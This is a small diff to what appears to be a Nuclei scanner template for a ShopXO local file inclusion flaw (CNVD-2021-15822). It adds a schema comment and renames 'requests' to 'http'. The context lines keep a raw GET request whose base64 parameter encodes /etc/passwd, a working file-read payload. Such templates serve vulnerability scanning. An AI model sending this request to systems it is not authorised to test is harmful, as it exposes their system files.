@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2021-15822
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
   tags: shopxo,lfi
 
-requests:
+http:
   - raw:
       - |
         GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
